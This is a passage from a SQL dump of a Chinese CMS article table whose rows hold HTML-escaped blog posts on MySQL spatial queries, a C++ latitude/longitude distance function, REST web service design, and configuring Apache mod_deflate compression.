style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @radius = 20;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location) FROM Points WHERE Distance(location, GeomFromText(@point)) &amp;lt; @radius;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;但是这条语句运行会出错，因为&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;Distance&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;函数还没有实现。&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;MySql&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;空间扩展文档说明中已经说明他们只实现了&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;OpenGis&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;标准的一部分。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1305167260, 1, 'admin'),
(112, 1, 'MYSQL的空间查询（二）', '', '', '&lt;div id=&quot;blog_text&quot; class=&quot;cnt&quot;&gt;&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;一个替代的方式是使用&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;intersect&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;函数。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;MySql&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;空间扩展文档中已经指明各种几何对象可以使用&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-size:12px;&quot;&gt;intersect&lt;/span&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;函数来判断几何对象是否和一个矩形相交。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:small;&quot;&gt;&lt;span style=&quot;padding:0px;margin:0px;font-family:宋体;font-size:12px;&quot;&gt;这样在取得近似范围后我们可以再使用距离估算来过滤出正确的结果。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @center = GeomFromText(''POINT(10 10)'');&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @radius = 30;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SET @bbox = CONCAT(''POLYGON(('',&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;X(@center) - @radius, '' '', Y(@center) - @radius, '','',&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;X(@center) + @radius, '' '', Y(@center) - @radius, '','',&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;X(@center) + @radius, '' '', Y(@center) + @radius, '','',&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;X(@center) - @radius, '' '', Y(@center) + @radius, '','',&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;X(@center) - @radius, '' '', Y(@center) - @radius, ''))''&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;);&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;[1]&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location)&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;FROM Points&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;WHERE Intersects( location, GeomFromText(@bbox) )&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;AND SQRT(POW( ABS( X(location) - X(@center)), 2) + POW( ABS(Y(location) - Y(@center)), 2 )) &amp;lt; @radius; To Obtain a result ordered by distance from the center of the selection area:&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;[2]&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;SELECT name, AsText(location), SQRT(POW( ABS( X(location) - X(@center)), 2) + POW( ABS(Y(location) - Y(@center)), 2 )) AS distance&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;FROM Points&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;WHERE Intersects( location, GeomFromText(@bbox) )&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;AND SQRT(POW( ABS( X(location) - X(@center)), 2) + POW( ABS(Y(location) - Y(@center)), 2 )) &amp;lt; @radius&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span style=&quot;padding:0px;margin:0px;color:#000000;font-size:12px;&quot;&gt;ORDER BY distance;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1305167291, 1, 'admin'),
(113, 1, '已知经纬度计算距离的办法', '', '', '&lt;div class=&quot;bct fc05 fc11 nbw-blog ztag js-fs2&quot;&gt;&lt;p&gt;这是我在编写一个应用程序时遇到的问题，感谢资源丰富的网络和便利的搜索引擎让我很快找到了答案，下载了几篇介绍的文章并用程序验证后发现这个据说是Google地图里的Java代码结果可靠，我把它稍加改动用到VC++工程里。其中Lat表示纬度，Lng表示经度，如果遇到南纬北纬都有时一个取正值一个取负值即可，程序返回值单位是千米。我在实际应用中是多个点也就是多个折线的距离，在循环里多次调用就可以了。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n#define PI 3.1415926535&lt;/p&gt;\r\n&lt;p&gt;double CaculateDistance(double lat1, double lng1, double lat2, double lng2)&amp;nbsp; &lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double EARTH_RADIUS = 6378.137;&amp;nbsp;&amp;nbsp; // 地球半径&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double radLat1 = lat1*PI/180;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // 转化为弧度值&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double radLat2 = lat2*PI/180;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double a = radLat1 - radLat2;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double b = (lng1 - lng2)*PI/180;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; double s = 2 * asin(sqrt(pow(sin(a/2),2) + cos(radLat1)*cos(radLat2)*pow(sin(b/2),2)));&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; s = s * EARTH_RADIUS;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return s;&lt;br /&gt;\r\n}&lt;/p&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1305191866, 1, 'admin'),
(114, 1, '基于Rest风格web服务的研究', '', '', '&lt;p&gt;&lt;b&gt;摘要&lt;/b&gt;：Web服务从诞生到现在已有十余年历史，人们用它来解决不同平台之间的互操作问题。传统的Web服务的是基于RPC风格的，其实现技术主要包含SOAP、WS标准栈等。RPC风格的Web服务在相对封闭，用在Web这个分布的、开放的环境中将带来一些问题，如技术架构复杂、可伸缩性差等。研究的REST式风格Web服务足以解决上述问题。 &lt;p&gt;&lt;b&gt;关键字&lt;/b&gt;：Rest 、架构&lt;a name=&quot;_Toc200680791&quot;&gt;&lt;/a&gt;&lt;a name=&quot;_Toc199135527&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;、web服务、HTTP、URI&lt;/font&gt;&lt;/a&gt; &lt;p&gt;引言：REST风格是由HTTP协议的编写者Roy Thomas Fielding在他的博士论文中正式提出的，一种现代Web架构模型，用来指导Web的设计、定义和部署。REST也可以说是HTTP和URI这两个Web架构基础协议背后的设计原理，基于REST风格来设计Web应用的架构，就是最大限度利用HTTP和URI潜力的最佳实践。其实当HTTP被发明出来的时候，REST就已经存在了，只是后来的Web开发模式越来越背离HTTP的本质，舍本逐末的追求了RPC模型。利用REST风格构建的Web服务可以充分利用Web的特性，解决传统的构建Web服务带来的问题。 &lt;p&gt;1．Rest架构的介绍 &lt;p&gt;REST(Representational State Transfer)是Roy Feilding的博士论文中提出的概念，它是Web系统体系结构设计原则的一种描述，一种基于资源的服务访问架构。Roy Feilding在他的论文中对REST的定义是:REST 的目的是决定如何使一个良好设计的Web程序向前进行，用户可以通过选择一个带有超链接的Web页面上的超链接(代表状态迁移)，使得另一个Web页面(代表程序的下一个状态)返回到用户，使得Web程序能进一步运行。例如：客户请求某火车站的购票服务，返回结果的页面中包含有火车班次和时刻表两个链接，则这两个链接是对服务端提供资源的表(Representational)。得到返回结果后，客户选择一个链接来决定下一步动作，这意味着客户的状态也随着迁移。这样客户可以维护自己的程序状态。 &lt;p&gt;&lt;a name=&quot;_Toc200680793&quot;&gt;&lt;/a&gt;&lt;a name=&quot;_Toc199135529&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;2. REST&lt;/font&gt;&lt;/a&gt;与CRUD原则的关系 &lt;p&gt;REST软件架构遵循了CRUD原则，该原则告诉我们对于资源（包括网络资源）只需要四种行为：创建（Create）、获取（Read）、更新（Update）和销毁（DELETE）就可以完成对其操作和处理了。其实世界万物都是遵循这一规律：生、变、见、灭。所以计算机世界也不例外。这个原则是源自于我们对于数据库表的数据操作：insert（生）、select（见）、update（变）和delete（灭），所以有时候CRUD也写作为RUDI，其中的I就是insert。这四个操作是一种原子操作，即一种无法再分的操作，通过它们可以构造复杂的操作过程，正如数学上四则运算是数字的最基本的运算一样。&lt;a name=&quot;_Toc200680797&quot;&gt;&lt;/a&gt;&lt;a name=&quot;_Toc199135538&quot;&gt;&lt;/a&gt; &lt;p&gt;3. 构建基于REST方式的Web服务 &lt;p&gt;Web 服务技术让应用程序可以用平台独立或编程语言独立的方式相互通信。但是传统的XML- RPC 风格的Web 服务, 正逐渐受到复杂性恶魔的威胁, 称作REST 风格的Web Services 提供了更简单的替代方式。 &lt;p&gt;在基于REST 方式Web系统中，所有资源都有一个URI，包括Web服务也用URI来标识。用以资源标识的URI最好是逻辑URI(例:http://www.anyshop.com/5686)，而不是物理URI(&lt;a href=&quot;http://www.anyshop.com/5686.html&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;http://www.anyshop.com/5686.html&lt;/font&gt;&lt;/a&gt;)。 &lt;p&gt;使用逻辑URI的好处是对服务器端的资源修改不影响客户的使用。使用 HTTP的CET、POST、PUT和DELEIT 4个动作作为资源的通用接口，用户通过它们访问资源。在此，HTTP作为一个程序协议来使用，而不是只作为传送一个SOAP消息的传输协议来使用。 &lt;p&gt;以某零件公司的零件仓库Web服务为例来解释REST Web服务的基本思想。部署在服务器上的零件仓库对外发布一些服务，从而客户能够: &lt;p&gt;l 获取 一 份元件清单。 &lt;p&gt;l 获取某个特定元件的详细信息。 &lt;p&gt;l 提交一个采购清单(OP)。 &lt;p&gt;l 获取元件清单 &lt;p&gt;由于 基 于 REST的Web服务可以通过一个URI来访问，因此调用一个Web服务就十分简单。顾客在订购单(Order1)里需要获得零件的列表，假设有一个Web服务PartsList实现此功能，那么使用http://www.anycorp.com/PartsList即可得到零件列表。客户只需这样调用，至于服务器端如何实现，对客户来说是透明的。因为对客户是透明的，所以服务器可以自由的修改资源而不影响客户，实现了松散藕合的特性。 &lt;p&gt;客户知道使用前面的URL 后，那么服务器将返回包含零件列表的一个文档,即: &lt;p&gt;&amp;lt;? xml version”1.0”&amp;gt; &lt;p&gt;&amp;lt;p:Parts xmlns:p=”&lt;a href=&quot;http://www.anycorp.com/&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;http://www.anycorp.com&lt;/font&gt;&lt;/a&gt;” &lt;p&gt;Xmlns:xlink=”http://www.w3.org/1999/xlink”&amp;gt; &lt;p&gt;&amp;lt;Part id = “00345” xlink:href = “http://www.anycorp.com/PartsList/00345”&amp;gt; &lt;p&gt;&amp;lt;Part id = “00346” xlink:href =“http://www.anycorp.com/PartsList/00346”&amp;gt; &lt;p&gt;&amp;lt;/p:Parts&amp;gt; &lt;p&gt;返回的文档中包含了对各个零件的链接，客户选择合适的链接可以将该链接指向的资源迁移到客户，实现客户状态的自维护，这是REST的关键特征。获取某个特定元件的详细信息 &lt;p&gt;如果想要以XML形式返回每个零件详细的信息，只需在URL后加上零件编号参数，比如http://www.anycorp.com/PartsList/00345，则会返回如下的文档: &lt;p&gt;&amp;lt;? Xml version=”1.0”&amp;gt; &lt;p&gt;&amp;lt;p:Part xmlns:p=”&lt;a href=&quot;http://www.parts-depot.com/&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;http://www.parts-depot.com&lt;/font&gt;&lt;/a&gt;” &lt;p&gt;Xmlns:xlink=”http://www.w3.org/1999/xlink”&amp;gt; &lt;p&gt;&amp;lt;Part-ID&amp;gt;00345&amp;lt;/Part-ID&amp;gt; &lt;p&gt;&amp;lt;Name&amp;gt;Widget-A&amp;lt;/Name&amp;gt; &lt;p&gt;&amp;lt;Description&amp;gt;This part is used within the frap assembly&amp;lt;/Description&amp;gt; &lt;p&gt;&amp;lt;Specification xlink:href=”&lt;a href=&quot;http://www.anycorp.com/PartsList/00345/specification&quot;&gt;&lt;font color=&quot;#1d58d1&quot;&gt;http://www.anycorp.com/PartsList/00345/specification&lt;/font&gt;&lt;/a&gt;”/&amp;gt; &lt;p&gt;&amp;lt;UnitCost currency=”USD”&amp;gt;0.10&amp;lt;/UnitCost&amp;gt; &lt;p&gt;&amp;lt;Quantity&amp;gt;10&amp;lt;/Quantity&amp;gt; &lt;p&gt;&amp;lt;/p:Part&amp;gt; &lt;p&gt;从以上返回的数据看，这个数据又链接到更多的数据。客户可继续选择这些链接以获得更详细的数据，这正是REST的关键所在。 &lt;p&gt;提交一个采购清单(OP),这个服务利用一个指向PO提交的URL。客户依照零件仓库预先定义的PO格式创建一个PO实例文档。客户将PO.xml作为HTTP POST承载的内容提交上来。PO服务响应此PO提交请求，从而客户可以随时检索、更新、编辑这个PO。PO 于是成为客户端与服务器端共享的一段信息。共享信息(PO)由服务器端指定的URL访问，并暴露为一个Web服务。&lt;a name=&quot;_Toc200680800&quot;&gt;&lt;/a&gt; &lt;p&gt;4.REST Web服务设计原则 &lt;p&gt;(1) 以REST构建Web服务的关键是要正确识别作为服务的资源。 &lt;p&gt;(2) 为每个资源提供URL，资源应该是名词，不是动词。 &lt;p&gt;(3) 根据客户处理资源的方式分类，可以分为客户仅接收资源的表现性和客户能够修改(增加)资源。对于前者，提供HTTP GET 方法访问，对于后者，提供HTTP POST,PUT和DELETE。 &lt;p&gt;(4) 所有通过HTTP CET访问的资源应该是不可更改的。即是说，这些资源仅仅向客户返回一个资源的表现性，客户调用他们不能更改它们。 &lt;p&gt;(5) 没有孤立的表现性。换言之，在资源的表现性中提供链接，让客户能更深人的获取更多的信息，或者相关信息。 &lt;p&gt;(6) 逐步的提供数据，不应该在一个文档里提供所有的内容，可以为更详细的信息提供链接。 &lt;p&gt;因为REST是对当今Web体系结构设计原则的一种描述，所以REST的目标和原则是对当今Web中已经成功应用的要素的总结。 &lt;p&gt;4. 总结 &lt;p&gt;本文描述了基于REST的Web服务设计原则和特点，以及构建基于REST的Web服务的思想。通过对REST的理解，REST必然会对Web服务的体系结构产生重要的影响基于REST 的Web服务必将推进当前Web服务技术的大规模应用和进一步发展。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305210332, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(115, 1, 'Apache2使用mod_deflate压缩提升网络页面浏览速度', '', '', '&lt;div id=&quot;blog_text&quot; class=&quot;cnt&quot;&gt;&lt;p&gt;apache2已经用mod_deflate代替了mod_gzip&lt;/p&gt;\r\n&lt;p&gt;apache2已经包含了mod_deflate&lt;/p&gt;\r\n&lt;p&gt;打开模组&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;/usr/local/apache2/bin/apxs -i -c /yourpath/httpd-2.2.3/modules/filters/mod_deflate.c&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;httpd.conf添加&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;LoadModule deflate_module modules/mod_deflate.so&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;如果想只压缩html,text,xml 如果下面配置:&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;AddOutputFilterByType DEFLATE text/html text/plain text/xml&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n下面给出我的配置档:&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;LoadModule deflate_module modules/mod_deflate.so&lt;/li&gt;\r\n&lt;li&gt;SetOutputFilter DEFLATE&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4 gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4\\.0[678] no-gzip&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Don''t compress images&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI \\&lt;/li&gt;\r\n&lt;li&gt;\\.(?:gif|jpe?g|png)$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI \\&lt;/li&gt;\r\n&lt;li&gt;\\.(?:exe|t?gz|zip|bz2|sit|rar)$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI \\&lt;/li&gt;\r\n&lt;li&gt;\\.pdf$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt;SetEnvIfNoCase Request_URI \\&lt;/li&gt;\r\n&lt;li&gt;\\.(css|js)$ no-gzip dont-vary&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Make sure proxies don''t deliver the wrong content&lt;/li&gt;\r\n&lt;li&gt;Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Input input_info&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Output output_info&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Ratio ratio_info&lt;/li&gt;\r\n&lt;li&gt;LogFormat ''&quot;%r&quot; %{output_info}n/%{input_info}n (%{ratio_info}n%%)'' deflate&lt;/li&gt;\r\n&lt;li&gt;CustomLog logs/deflate_log.log deflate&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;在apache的使用手册上还有这么一句,但是不知道为什么不能添加上去.&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;# Make sure proxies don''t deliver the wrong content&lt;/li&gt;\r\n&lt;li&gt;Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;这个可以压缩 SVN 出来的文件。&lt;/p&gt;\r\n&lt;p&gt;———————————————&lt;/p&gt;\r\n&lt;p&gt;不能添加的原因是下面的模组没有打开：&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;LoadModule headers_module modules/mod_headers.so&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;=================&lt;/p&gt;\r\n&lt;p&gt;Apache deflate模块配置说明&lt;br /&gt;\r\n前几天一直在找apache2.0以dso方式编译后加载deflate模块的办法&lt;br /&gt;\r\n试了apxs -ica mod_deflate.c N次，始终是报&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;Cannot load /opt/apache/modules/mod_deflate.so into server: /opt/apache/modules/mod_deflate.so: undefined symbol: deflate&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;异常的痛苦，什么ldd mod_deflate.so后再export LIB_LIBRARY_PATH呀，都试了N次，google也go了N天。终于在google上go出来一篇文章，终于解决，方法如下：&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;vi /usr/local/apache2/bin/apr-config&lt;/li&gt;\r\n&lt;li&gt;修改LDFLAGS=&quot; &quot; 为 LDFLAGS=&quot;-lz&quot;&lt;/li&gt;\r\n&lt;li&gt;然后再apxs -ica mod_deflate.c&lt;/li&gt;\r\n&lt;li&gt;就OK了&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;另外在配置deflate规则时&lt;br /&gt;\r\napache2.0推荐加上这句&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;Header append Vary User-Agent env=!dont-vary&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;以便确保不会输出在压缩过程中出现内容方面的error&lt;br /&gt;\r\n但一般情况下，在测试apache的语法过程中会现出&lt;br /&gt;\r\nInvalid command ‘Header’, perhaps mis-spelled or defined by a module not included in the server configuration&lt;br /&gt;\r\n解决办法就是加载一个headers模块就OK了&lt;/p&gt;\r\n&lt;p&gt;不过最好还是在编译apache模块时直接加上–enable-deflate –enable-headers就省事多了。&lt;/p&gt;\r\n&lt;p&gt;一、 需求&lt;br /&gt;\r\n压缩apache的输出内容，降低网站带宽&lt;br /&gt;\r\n二、 加载Apache的deflate模块&lt;br /&gt;\r\n1、 修改apr-config&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;vi /usr/local/apache2/bin/apr-config&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;修改LDFLAGS=” ” 为 LDFLAGS=”-lz”&lt;br /&gt;\r\n2、 到apache源安装目录下,例如&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;cd /root/httpd-2.0.55/modules/filters&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;3、加载mod_deflate模块&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;/usr/local/apache2/bin/apxs -i -a -c mod_deflate.c&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;如果没有安装headers模块，加载headers模块&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;cd /root/httpd-2.0.55/modules/metadata&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;加载mod_headers模块&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;/usr/local/apache2/bin/apxs -i -a –c mod_headers.c&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;三、配置Apache主配置文件&lt;br /&gt;\r\n1. 在httpd.conf主配置文件里添加如下行&lt;/p&gt;\r\n&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol title=&quot;Double click to hide line number.&quot; class=&quot;hl-main ln-show&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;#声明输入流的byte数量&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Input instream&lt;/li&gt;\r\n&lt;li&gt;#声明输出流的byte数量&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Output outstream&lt;/li&gt;\r\n&lt;li&gt;#声明压缩的百分比&lt;/li&gt;\r\n&lt;li&gt;DeflateFilterNote Ratio ratio&lt;/li&gt;\r\n&lt;li&gt;#声明日志类型&lt;/li&gt;\r\n&lt;li&gt;LogFormat ''&quot;%r&quot; %{outstream}n/%{instream}n (%{ratio}n%%)'' deflate&lt;/li&gt;\r\n&lt;li&gt;CustomLog logs/deflate_log deflate&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;#指定压缩参数&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Insert filter&lt;/li&gt;\r\n&lt;li&gt;SetOutputFilter DEFLATE&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Netscape 4.x has some problems...&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4 gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# Netscape 4.06-4.08 have some more problems&lt;/li&gt;\r\n&lt;li&gt;BrowserMatch ^Mozilla/4\\.0[678] no-gzip&lt;/li&gt;\r\n&lt;li&gt; &lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;li&gt;# MSIE masquerades as Netscape, but it is fine&lt;/li&gt;\r\n&lt;li&gt;# BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html&lt;/li&gt;\r\n&lt;li&gt; &lt;br 